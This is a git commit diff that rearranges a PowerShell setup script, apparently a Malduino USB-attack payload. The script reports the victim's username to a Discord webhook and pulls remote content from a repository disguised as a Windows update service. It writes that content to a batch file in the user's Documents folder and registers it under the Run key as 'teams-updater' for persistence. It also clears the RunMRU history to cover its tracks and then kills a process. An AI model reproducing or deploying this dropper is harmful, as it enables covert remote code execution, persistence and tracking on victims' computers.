57b03b6d1d1335f181091552aa12c32402aae63a
Dejanoator <dejanoator@gmail.com>
2023-07-08 13:54:31 +0200

    Update setup.ps1

--- setup.ps1
+++ setup.ps1
@@ -1,12 +1,12 @@
 # Command 1
-$data = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielAckermann69/WindowsUpdateService/main/redownload.txt'
-
-# Command 2
 Start-Sleep -Seconds 5
 $webhookUrl = 'https://discord.com/api/webhooks/1100407460491169862/Wb_kr_f72PHdI5HhozZXMRekfr9XPtdXtw4TWjPLZARjT4sD0TraoPpuxhf8N2FNTY4E'
 $message = "Malduino w hat den download beim User $env:USERNAME gestarted."
 $body = @{content = $message} | ConvertTo-Json
 Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType 'application/json'
+
+# Command 2
+$data = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/DanielAckermann69/WindowsUpdateService/main/redownload.txt'
 
 # Command 3
 New-Item -Path "C:/Users/$env:USERNAME/Documents/w.bat"
@@ -16,7 +16,6 @@ Set-Content -Path "C:/Users/$env:USERNAME/Documents/w.bat" -Value $data.Content
 Start-Sleep -Seconds 5
 New-ItemProperty -Path HKCU:/Software/Microsoft/Windows/CurrentVersion/Run -Name "teams-updater" -Value "C:\Users\$env:USERNAME\Documents\w.bat" -PropertyType String
 reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
-
 
 # Command 5
 taskkill -im WindowsUpdateService.exe -f
